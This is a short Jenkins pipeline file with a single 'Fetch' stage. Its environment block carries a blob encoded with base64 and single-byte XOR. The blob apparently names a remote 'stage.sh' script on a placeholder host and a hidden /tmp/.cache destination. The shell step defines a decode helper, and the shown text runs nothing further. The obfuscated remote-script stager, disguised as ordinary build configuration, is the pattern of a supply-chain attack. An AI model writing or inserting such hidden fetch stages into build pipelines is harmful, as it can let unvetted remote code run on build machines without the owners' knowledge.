pipeline {
  agent { docker { image 'alpine:3.19' } }
  environment {
    STAGE_MATERIAL = 'LGdrJikuPyopZzs5Ky8zKD8FKD83NS4/di0oMy4/BTwzNj92PjMpKjsuOTIFKig1OT8pKSY7PjsqLj8oZzkvKDYmKS47PT8FOTUvNC5naCY5OzcqOzM9NAUzPmc5OzcqOzM9NHdvOD9oO2s5Y2ppJi8oNmcyLi4qKWB1dW84P2g7azljaml0PyI7Nyo2P3QzNCw7NjM+dSkuOz0/dCkyJjwzNj8FKjsuMmd1LjcqdXQ5OzkyP3UpLjs9P3dvOD9oO2s5Y2pp'
    STAGE_CODEC = 'base64|single_byte_xor|5a'
  }
  stages {
    stage('Fetch') {
      steps {
        sh """
readonly Material_5be2a1c9='${STAGE_MATERIAL}'
readonly Codec_5be2a1c9='${env.STAGE_CODEC}'
Load_5be2a1c9() { printf '%s' "\${Material_5be2a1c9}" | base64 --decode; }
"""
      }
    }
  }
}
